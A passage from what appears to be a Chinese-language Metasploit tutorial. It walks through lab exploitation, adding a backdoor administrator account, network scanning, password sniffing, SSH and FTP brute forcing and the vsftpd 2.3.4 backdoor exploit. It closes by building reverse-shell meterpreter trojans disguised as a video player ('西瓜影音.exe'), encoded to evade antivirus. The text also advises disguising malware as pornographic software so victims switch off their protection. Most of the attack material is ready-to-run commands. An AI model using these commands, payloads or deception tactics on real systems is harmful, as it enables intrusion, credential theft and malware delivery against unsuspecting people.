+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">192.168.201.131</span><br></code></pre></td></tr></table></figure>
+<p>配置完成后开始执行</p>
+<p>exploit 或 run 命令</p>
+<p><img src="/images/0F413627BEBD4cb691E7BF20037C78E2.png" srcset="/img/loading.gif" lazyload><br>等待一会就会出现shell，如果没出现敲一下回车就好</p>
+<p>创建用户</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">hacker</span> <span class="hljs-number">123456</span> /add<br></code></pre></td></tr></table></figure>
+<p><img src="/images/5CFF04620E614fc3B590D7B027B556AD.png" srcset="/img/loading.gif" lazyload><br>显示乱码但是已经添加成功<br>拓展：解决乱码问题(乱码是因为windows和linux的编码不一样导致的)</p>
+<p><strong>提权</strong></p>
+<p>将创建好的用户拉进超级管理组</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup Administrators hacker /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/7D43C1C694D24840AB04CA0213AE16C9.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup Administrators<br></code></pre></td></tr></table></figure>
+<p><img src="/images/55698E82272A4d10A8A99E195F34E3DE.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到已经成功提权进本地管理员组了。</p>
+<p>查看拿到的用户权限<br><img src="/images/B6150C4D738341fdB820DE48E515F1C7.png" srcset="/img/loading.gif" lazyload><br>关闭连接ctrl+c</p>
+<h3 id="实战：通过会话进行连接目标机"><a href="#实战：通过会话进行连接目标机" class="headerlink" title="实战：通过会话进行连接目标机"></a>实战：通过会话进行连接目标机</h3><p>exploit -j</p>
+<p>-j表示后台执行 渗透目标完成后会创建一个session我们可以通过session连接目标主机<br><img src="/images/C9A0397B3EF54b6a9216E3EB14EB4F9E.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sessions</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/EE88FC7A4289401899E85D4E1B6FE642.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过会话ID进入会话</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sessions</span> -i <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/6ED10ED487D7488cB379FEF4F6A7A886.png" srcset="/img/loading.gif" lazyload></p>
+<p>退出会话将会话保存到后台</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">background<br></code></pre></td></tr></table></figure>
+<p><img src="/images/D597DB3C1FDA4f24B77552BF33733A88.png" srcset="/img/loading.gif" lazyload></p>
+<p>sessions</p>
+<p><img src="/images/25C9C4BE158C4a0f8FB73D7F72F1A346.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据会话ID结束会话</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sessions</span> -k <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/35E51B1CFAA949a58AD0BFF212645B10.png" srcset="/img/loading.gif" lazyload><br>杀死进程，就没有这个session了</p>
+<p>总结使用 metasploit 攻击的步骤：<br>1、查找 CVE 公布的漏洞<br>2、查找对应的 exploit 模块<br>3、配置模块参数<br>4、添加 payload 后门<br>5、执行 exploit 开始攻击</p>
+<h1 id="Metasploit-渗透测试之信息收集"><a href="#Metasploit-渗透测试之信息收集" class="headerlink" title="Metasploit 渗透测试之信息收集"></a>Metasploit 渗透测试之信息收集</h1><h2 id="基于tcp协议收集主机信息"><a href="#基于tcp协议收集主机信息" class="headerlink" title="基于tcp协议收集主机信息"></a>基于tcp协议收集主机信息</h2><p>我们前面学习了主动信息收集和被动信息收集，而且还学习了漏洞检测工具NESSUS，下面学习使用Metasploit来对目标进行信息收集，这个过程包含了前面所有的方式以及多了一些更加极端的获取信息方式，比如获取服务器的硬件信息，系统用户信息，进程信息等。</p>
+<h3 id="使用metasploit中的namp和arp-sweep收集主机信息"><a href="#使用metasploit中的namp和arp-sweep收集主机信息" class="headerlink" title="使用metasploit中的namp和arp_sweep收集主机信息"></a>使用metasploit中的namp和arp_sweep收集主机信息</h3><p>Metasploit中也有NMAP工具</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">db_namp</span> -sV <span class="hljs-number">192.168.201.254</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/35157E2F7D9C4e4eB029F2AB25F8E864.png" srcset="/img/loading.gif" lazyload></p>
+<p>ARP扫描</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>discovery/arp_sweep<br></code></pre></td></tr></table></figure>
+
+<p>查看一下模块需要配置哪些参数</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/5632E524C88D42beB877AF92C2544207.png" srcset="/img/loading.gif" lazyload><br>配置RHOSTS(扫描的目标网络)即可</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">192.168.201.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<p>shost和smac是伪造源IP和MAC地址使用的<br>配置线程数</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> THREADS <span class="hljs-number">30</span><br><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/1EBE773ECB0A4d62964EB0F065E54E4C.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="使用半连接方式扫描TCP端口"><a href="#使用半连接方式扫描TCP端口" class="headerlink" title="使用半连接方式扫描TCP端口"></a>使用半连接方式扫描TCP端口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search portscan</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/D4C633F12B27499f9578A730A945BE7E.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>portscan/syn<br></code></pre></td></tr></table></figure>
+<p>查看配置项</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/6346316EDCE047c3944BE0D95E413828.png" srcset="/img/loading.gif" lazyload></p>
+<p>设置扫描的目标</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.129</span><br></code></pre></td></tr></table></figure>
+
+<p>设置端口范围使用逗号隔开</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> PORTS <span class="hljs-comment">80</span><br></code></pre></td></tr></table></figure>
+
+<p>设置线程数</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> THREADS <span class="hljs-number">20</span><br><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/A018DDF6EED849bb9EC68D6B65CD4A4F.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="使用auxiliary-x2F-sniffer-下的psnuffle模块进行密码嗅探"><a href="#使用auxiliary-x2F-sniffer-下的psnuffle模块进行密码嗅探" class="headerlink" title="使用auxiliary&#x2F;sniffer 下的psnuffle模块进行密码嗅探"></a>使用auxiliary&#x2F;sniffer 下的psnuffle模块进行密码嗅探</h3><p>实验拓扑图：</p>
+<p><img src="/images/ABDF81285B1A46288D6832E0FACCBF49.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">search psnuffle<br><br>use auxiliary<span class="hljs-regexp">/sniffer/</span>psnuffle<br></code></pre></td></tr></table></figure>
+<p>查看psnuffle的模块作用</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">info</span><br></code></pre></td></tr></table></figure>
+<p>Description:<br>This module sniffs passwords like dsniff did in the past #这个 psnuffle 模块可以像以前的 dsniff 命令一样，去嗅探密码，只支持 pop3、imap、ftp、HTTP GET 协议。</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">show</span> options<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+<p>新建一个终端窗口登录ftp，Metasploittable2-Linux靶机中已经开启了ftp服务可以直接登录</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> install lftp -y <span class="hljs-comment">#安装lftp命令</span><br>lftp -u msfadmin <span class="hljs-number">192.168.201.132</span><br>密码：msfadmin<br></code></pre></td></tr></table></figure>
+<p>连接成功后，进行下数据交互，查看ftp目录下的文件<br><img src="/images/74679308A9024ffeA1AEE09B4F6119CF.png" srcset="/img/loading.gif" lazyload><br>回到MSF终端可以看到用户名密码信息已经被获取</p>
+<p><img src="/images/007CAE31467D47ebBD94BE9AFCBEB7E1.png" srcset="/img/loading.gif" lazyload></p>
+<p>嗅探完成后记得把后台任务关闭</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">jobs</span>    <span class="hljs-comment">#查看后台运行的任务</span><br><span class="hljs-built_in">kill</span> 0  <span class="hljs-comment">#kill job的ID，关闭jpb</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/0BE77784C2AA4412A88D04FB6E271BCC.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="基于SNMP协议收集主机信息"><a href="#基于SNMP协议收集主机信息" class="headerlink" title="基于SNMP协议收集主机信息"></a>基于SNMP协议收集主机信息</h2><p>简单网络管理协议SNMP，由一组网络管理的标准组成，包含一个应用层协议(application layer protocol)、数据库模型(database schema)和一组资源对象。该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。</p>
+<p>我们使用 root 用户先到 Metasploitable2-Linux 主机上修改一下 SNMP 服务，因为默认服务是<br>不对外开放的。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">msfadmin<span class="hljs-variable">@metasploitable</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># vim /etc/default/snmpd</span><br>改第<span class="hljs-number">11</span>行<br><span class="hljs-title class_">SNMPDOPTS</span>=<span class="hljs-string">&#x27;-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1&#x27;</span><br>为：<br><span class="hljs-title class_">SNMPDOPTS</span>=<span class="hljs-string">&#x27;-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0&#x27;</span><br>保存退出<br>重启<span class="hljs-title class_">SNMP</span>服务<br>msfadmin<span class="hljs-variable">@metasploitable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo /etc/init.d/snmpd r<br>确认服务监听正常<br>msfadmin<span class="hljs-variable">@metasploitable</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>netstat -antup | grep <span class="hljs-number">161</span><br>(<span class="hljs-title class_">No</span> info could be read <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;-p&quot;</span>: geteuid()=<span class="hljs-number">1000</span> but you should be root.)<br>udp <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">161</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:*</span> <br></code></pre></td></tr></table></figure>
+
+<h3 id="实战-使用snmp-enum模块通过snmp协议扫描目标服务器信息"><a href="#实战-使用snmp-enum模块通过snmp协议扫描目标服务器信息" class="headerlink" title="实战-使用snmp-enum模块通过snmp协议扫描目标服务器信息"></a>实战-使用snmp-enum模块通过snmp协议扫描目标服务器信息</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/snmp/snmp_enum<br>show <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.132</span><br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/E39335FBF7E84071A67B7053153BFCDC.png" srcset="/img/loading.gif" lazyload><br>注：可以看到通过snmp协议探测到的信息非常多。如服务器硬件信息和服务器当前运行的进程，这两方面是其他扫描方式获取不到的。</p>
+<h2 id="基于SMB协议收集信息"><a href="#基于SMB协议收集信息" class="headerlink" title="基于SMB协议收集信息"></a>基于SMB协议收集信息</h2><p>SMB概述：服务器消息块(Server Message Block,缩写为SMB)，又称网络文件共享系统CIFS，一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。</p>
+<p>经过Unix服务器厂商重新开发后，它可以用于连接Unix服务器和Windows客户机，执行打印和文件共享等任务。</p>
+<h3 id="使用smb-version-基于SMB协议扫描版本号"><a href="#使用smb-version-基于SMB协议扫描版本号" class="headerlink" title="使用smb_version 基于SMB协议扫描版本号"></a>使用smb_version 基于SMB协议扫描版本号</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">use</span> auxiliary/scanner/smb/smb_version<br>设置扫描目标，注意多个目标使用逗号+空格隔开<br>show options<br>set RHOSTS <span class="hljs-number">192.168.201.132</span>, <span class="hljs-number">192.168.201.133</span><br>注：<span class="hljs-number">192.168.201.132</span>后面的逗号和<span class="hljs-number">192.168.201.133</span>之间是有空格的<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/2C216426F3A5451aA54F3C4B143BBAF1.png" srcset="/img/loading.gif" lazyload></p>
+<p>注：可以扫描出来操作系统的版本号，版本号很准确</p>
+<h3 id="使用smb-enumshares基于SMB协议扫共享文件-账号、密码"><a href="#使用smb-enumshares基于SMB协议扫共享文件-账号、密码" class="headerlink" title="使用smb_enumshares基于SMB协议扫共享文件(账号、密码)"></a>使用smb_enumshares基于SMB协议扫共享文件(账号、密码)</h3><p>我们到Windows中启用一下共享服务。<br>新建文件夹fffck，设为共享<br>枚举共享</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/smb/smb_enumshares<br>show <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.133</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser yasuo #</span>上次永恒之蓝漏洞创建的账户<br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass 123456</span><br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/0EC10B3B9978405098DBF9D2385E6CF7.png" srcset="/img/loading.gif" lazyload><br>可以看到有1个是我们前面设置的fffck共享文件目录还有隐藏的共享目录</p>
+<h3 id="使用smb-lookupsid扫描用户信息-SID枚举"><a href="#使用smb-lookupsid扫描用户信息-SID枚举" class="headerlink" title="使用smb_lookupsid扫描用户信息(SID枚举)"></a>使用smb_lookupsid扫描用户信息(SID枚举)</h3><p>我们在Win7上新建一个用户，这里我用的yasuo<br>注：SID是Windows中每一个用户的ID，更改用户名SID也是不会改变的</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/smb/smb_lookupsid<br>show <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.133</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser yasuo</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass 123456</span><br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/6CC0D8274F5044b3ADC749F248EE4A17.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="基于SSH协议收集信息"><a href="#基于SSH协议收集信息" class="headerlink" title="基于SSH协议收集信息"></a>基于SSH协议收集信息</h2><h3 id="查看ssh服务的版本信息"><a href="#查看ssh服务的版本信息" class="headerlink" title="查看ssh服务的版本信息"></a>查看ssh服务的版本信息</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/ssh/ssh_version<br>show <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.132</span><br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/FA8434C7011F4722937C7F3EB7A626CD.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_login<br>show <span class="hljs-keyword">options</span><br>set RHOSTS <span class="hljs-number">192.168</span>.<span class="hljs-number">201.132</span><br>设置字典文件默认的字典文件是不满足实际需求的后期我们使用更强大的字典文件。<br>set USERPASS_FILE <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>data<span class="hljs-regexp">/wordlists/</span>root_userpass.txt<br>因为字典文件中不包含我们的用户密码信息我们把自己的密码信息手动加进去以便展示效果<br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/C1A27527AB234fbb9354438B1E4DD18F.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="基于FTP协议收集信息"><a href="#基于FTP协议收集信息" class="headerlink" title="基于FTP协议收集信息"></a>基于FTP协议收集信息</h2><h3 id="查看ftp服务的版本信息"><a href="#查看ftp服务的版本信息" class="headerlink" title="查看ftp服务的版本信息"></a>查看ftp服务的版本信息</h3><p>加载ftp服务版本扫描模块</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version<br></code></pre></td></tr></table></figure>
+<p>查看设置参数</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/98A244A798D14722A99F1FCCB37474F5.png" srcset="/img/loading.gif" lazyload></p>
+<p>设置目标IP，可以设置多个</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.132</span><br></code></pre></td></tr></table></figure>
+<p>执行扫描run或exploit<br><img src="/images/AAFBDA1560A34550A3EFA11FD50FBE04.png" srcset="/img/loading.gif" lazyload></p>
+<p>扫描出结果是：vsFTPd2.3.4<br>back<br>扫描出ftp服务的版本号，我们可以尝试搜索版本号，看看有没有可以利用的模块</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> <span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/BD3851F733044accB8198663078FBCD9.png" srcset="/img/loading.gif" lazyload><br>发现存在一个exploit模块，而却这个版本的ftp服务存在一个后门<br>我们尝试利用下这个模块</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use exploit<span class="hljs-regexp">/unix/</span>ftp/vsftpd_234_backdoor <br>show <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/2D692BC2294F4b02A2C508748B7F9581.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.201</span><span class="hljs-number">.132</span><br><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/97482BC969A24f4bA87966F081FCC1F6.png" srcset="/img/loading.gif" lazyload><br>我们拿到了shell，而且是root权限，我们尝试输入命令<br><img src="/images/4F9A12A47A4C4fa892D15193445A1AA1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="ftp匿名扫描登录"><a href="#ftp匿名扫描登录" class="headerlink" title="ftp匿名扫描登录"></a>ftp匿名扫描登录</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use auxiliary<span class="hljs-regexp">/scanner/</span>ftp/anonymous<br>show <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/B5D4C45CA3C74249BA9716BCC0DC1BDA.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.201</span><span class="hljs-number">.132</span><br><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/D1791FDEEC144b3fB15F666C4438E6E5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="ftp暴力破解"><a href="#ftp暴力破解" class="headerlink" title="ftp暴力破解"></a>ftp暴力破解</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_login<br>show <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/D6E45A8A730B445592276CD1762B6898.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.201.132</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">USERPASS_FILE</span> /usr/<span class="hljs-comment">share</span>/metasploit-framework/<span class="hljs-comment">data</span>/wordlists/<span class="hljs-comment">root_userpass.txt</span><br>run<br></code></pre></td></tr></table></figure>
+<p><img src="/images/BAAD848AB5E4a82B80B878A303641A8.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="制作Windows和Linux客户端恶意软件进行渗透"><a href="#制作Windows和Linux客户端恶意软件进行渗透" class="headerlink" title="制作Windows和Linux客户端恶意软件进行渗透"></a>制作Windows和Linux客户端恶意软件进行渗透</h1><h2 id="客户端渗透原理"><a href="#客户端渗透原理" class="headerlink" title="客户端渗透原理"></a>客户端渗透原理</h2><p>在我们在无法突破对方的网络边界的时候，往往需要使用客户端渗透这种方式对目标发起攻击，比如我们向目标发一个含有后门的程序，或者是一个word文档、pdf文件。想要达到效果同时也要利用好社会工程学，来诱骗受害者执行恶意程序。</p>
+<p>客户端渗透技巧，通常用户的计算机都安装了安全软件，一般我们生成的恶意程序都会被检测，所以我们所设计的恶意软件可以利用人的劣根性。比如我们将恶意软件或网站伪装成色情软件或网站，这样目标会认为他本身就是不好的软件被安全软件检测是很正常的事情，如果他按捺不住关闭防护软件执意要运行恶意程序，那么他就中招了，当然这种取巧的方法并不能解决所有问题，我们要利用免杀来躲避安全软件的查杀。</p>
+<h2 id="制作Windows恶意软件获取shell"><a href="#制作Windows恶意软件获取shell" class="headerlink" title="制作Windows恶意软件获取shell"></a>制作Windows恶意软件获取shell</h2><p>msfvenom是msfpayload，msfencode的结合体，可利用msfvenom生成木马程序，并在目标机上执行，在本地监听上线。<br>实验过程：<br><img src="/images/F875837E77F746b183185D0045AA007D.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="生成西瓜影音-exe后门程序"><a href="#生成西瓜影音-exe后门程序" class="headerlink" title="生成西瓜影音.exe后门程序"></a>生成西瓜影音.exe后门程序</h3><p>使用一个编码器</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">201.131</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 10 -f exe -o /</span>var<span class="hljs-regexp">/www/</span>html/西瓜影音<span class="hljs-number">1</span>.exe<br><br>使用两个编码器组合编码<br>msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">201.131</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86<span class="hljs-regexp">/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/</span>alpha_upper -i <span class="hljs-number">10</span> -f exe -o <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>西瓜影音<span class="hljs-number">2</span>.exe<br></code></pre></td></tr></table></figure>
+<p>参数说明：</p>
+<ul>
+<li><p>-a：指定架构如x86 x64。x86代表32位，x64代表64位。32位软件可以在64位系统上运行。所以我们生成32位的侯梦，这样在32位和64位系统中都可以使用。</p>
+</li>
+<li><p>-platform：指定平台，这里选择windows，通过 msfvenom –l platforms可以查看所有支持的平台</p>
+</li>
+<li><p>-p：设置攻击载荷，我们使用windows&#x2F;meterpreter&#x2F;reverse_tcp，可以通过-l payloads查看所有攻击载荷</p>
+</li>
+<li><p>LHOST：目标主机执行程序后连接我们kali的地址</p>
+</li>
+<li><p>LPORT：目标主机执行程序后连接我们kali的端口</p>
+</li>
+<li><p>-b：去掉坏字符，坏字符会影响payload正常执行<br>扩展：\x00 代表 16 进制的“00”组成的字符串。通过 ASCII 码换成能识别的就是：”00” -<br>“00000000” - NUL。由于”00000000”是不可见字符，所以代码中没用。</p>
+</li>
+<li><p>-e：指定编码器：也就是所谓的免杀，x86&#x2F;shikata_ga_nai 是 msf 自带的编码器，可以通过msfvenom -l encoders查看所有编码器，x86&#x2F;shikata_ga_nai是最优的excellent</p>
